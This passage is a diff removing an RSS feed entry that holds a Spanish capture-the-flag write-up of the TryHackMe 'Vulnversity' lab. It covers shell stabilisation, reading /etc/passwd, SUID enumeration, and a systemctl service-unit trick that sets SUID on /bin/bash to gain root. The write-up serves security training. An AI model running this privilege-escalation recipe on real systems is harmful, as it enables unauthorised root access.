-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ambas opciones, nos conseguirán una &lt;em&gt;consola&lt;/em&gt; dentro de la máquina víctima.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/13.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Es importante aclarar que la &lt;em&gt;consola&lt;/em&gt; que acabamos de conseguir, no es nada interactiva, esto quiere decir que si quisiéramos limpiar la &lt;em&gt;consola&lt;/em&gt; utilizando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + L&lt;/code&gt;, no pasará nada, así mismo si quisiéramos desplazarnos utilizando las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flechas&lt;/code&gt; del teclado, no nos será posible hacerlo, para ello deberemos de realizar el respectivo tratamiento de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TTY&lt;/code&gt;, para lo cual haremos lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash
-
-Ctrl + Z
-
-&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fg
-&lt;/span&gt;reset
-xterm
-
-&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
-&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash
-
-&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;rows &amp;lt;valor&amp;gt; columns &amp;lt;valor&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Los valores que colocaremos en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;valor&amp;gt;&lt;/code&gt; en el último comando, dependerán del tamaño de nuestra pantalla, por lo cual en una nueva terminal de nuestra máquina escribiremos lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stty -a
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/14.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Continuando con las preguntas de la plataforma, se nos pide averiguar por el usuario que maneja el servidor web, así como su respectiva flag. Para realizar esto podríamos dirigirnos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home&lt;/code&gt;, y listar los directorios que existen.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/15.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Aunque también podríamos filtrar del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, a través de expresiones regulares, todos aquello usuario que tengan una &lt;em&gt;shell&lt;/em&gt;, sea esta una:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;bash&lt;/li&gt;
-  &lt;li&gt;csh&lt;/li&gt;
-  &lt;li&gt;ksh&lt;/li&gt;
-  &lt;li&gt;sh&lt;/li&gt;
-  &lt;li&gt;tcsh&lt;/li&gt;
-  &lt;li&gt;zsh&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Esto sería bastante fácil, ya que todas, o casi todas las &lt;em&gt;shells&lt;/em&gt; terminan en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sh&lt;/code&gt;, de modo que con ambas formas podemos determinar que usuarios existen a nivel de sistema.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sh$&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/16.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez hemos listado los usuarios del sistema, podemos pasar a buscar en que ruta se encuentra la flag del usuario con bajos privilegios, para ello podemos hacer lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; user.txt 2&amp;gt; /dev/null
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/17.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;escalada-de-privilegios&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Escalada De Privilegios&lt;/h3&gt;
-
-&lt;p&gt;Para realizar esta última fase, la misma plataforma de &lt;em&gt;TryHackMe&lt;/em&gt; nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Para listar todos aquellos binarios con permisos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID&lt;/code&gt; asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; 2&amp;gt;/dev/null &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-uid&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/18.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;La mejor forma para abusar de cualquier binario, es recurrir a &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt;, esta página nos enseña como explotar binarios con &lt;em&gt;capabilities&lt;/em&gt; mal asignadas, binarios que se pueden ejecutar como root, y en este caso, binarios con permisos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID&lt;/code&gt; mal asignados.&lt;/p&gt;
-
-&lt;p&gt;El binario más extraño que nos encontramos es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/systemctl&lt;/code&gt;, ya que este comando lo que nos permite es controlar el sistema y sus servicios, por lo que procederemos a buscarlo en &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/19.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como podemos ver, podemos abusar de este binario fácilmente, además de que nos permite ejecutar cualquier código malicioso que queramos&lt;/p&gt;
-
-&lt;p&gt;Para conseguir la última flag haremos lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;TF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;.service
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;[Service]
-Type=oneshot
-ExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot;
-[Install]
-WantedBy=multi-user.target&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
-/bin/systemctl &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
-/bin/systemctl &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--now&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Si nos percatamos, lo único que modificamos de la información que nos provee &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GTFOBins&lt;/code&gt;, fue el código a ejecutar, en este caso, estamos asignando un permiso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID&lt;/code&gt; a la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;, para posteriormente, a través del parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt;, ejecutar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; manteniendo permisos y privilegios del usuario al que le pertenece el binario, en este caso al usuario root. Otro aspecto que se modificó, fue utilizar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/systemctl&lt;/code&gt; desde su ruta absoluta, mas no de su ruta relativa.&lt;/p&gt;
-
-&lt;p&gt;Una vez hemos abusado del binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/systemctl&lt;/code&gt;, haremos lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/bash -p
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Una vez siendo root, podemos pasar a buscar su respectiva flag, esto lo podemos hacer así:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; root.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/20.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-</description>
-        <pubDate>Mon, 25 Oct 2021 00:00:00 -0400</pubDate>
-        <link>/es/Vulnversity-TryHackMe/</link>
-        <guid isPermaLink="true">/es/Vulnversity-TryHackMe/</guid>
       </item>
     
   </channel>
